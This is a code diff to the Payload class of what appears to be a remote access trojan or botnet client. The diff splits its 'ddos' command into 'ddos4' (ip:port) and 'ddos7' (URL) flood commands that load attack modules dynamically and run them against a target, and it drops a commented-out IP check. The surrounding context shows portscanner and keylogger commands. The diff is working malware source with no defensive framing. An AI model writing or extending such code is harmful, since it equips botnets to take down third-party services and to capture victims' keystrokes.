@@ -2147,18 +2147,29 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.portscanner.__name__, str(e)))
 
-    @config(platforms=['linux','linux2'], command=True, usage='ddos <target>')
-    def ddos(self, target=None):
-        if 'ddos' not in globals():
-            self.load('ddos')
+    @config(platforms=['linux','linux2'], command=True, usage='ddos4 <ip:port>')
+    def ddos4(self, target=None):
+        if 'ddos4' not in globals():
+            self.load('ddos4')
         try:
             if target:
-                #if not ipv4(target): return "Error: invalid IP address '%s'" % target
-                return globals()['ddos'].run(target)
+                return globals()['ddos4'].run(target)
             else:
-                return self.ddos.usage
+                return self.ddos4.usage
         except Exception as e:
-            log("{} error: {}".format(self.ddos.__name__, str(e)))
+            log("{} error: {}".format(self.ddos4.__name__, str(e)))
+
+    @config(platforms=['linux','linux2'], command=True, usage='ddos7 url')
+    def ddos7(self, target=None):
+        if 'ddos7' not in globals():
+            self.load('ddos7')
+        try:
+            if target:
+                return globals()['ddos7'].run(target)
+            else:
+                return self.ddos7.usage
+        except Exception as e:
+            log("{} error: {}".format(self.ddos7.__name__, str(e)))
 
             
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='keylogger [mode]')
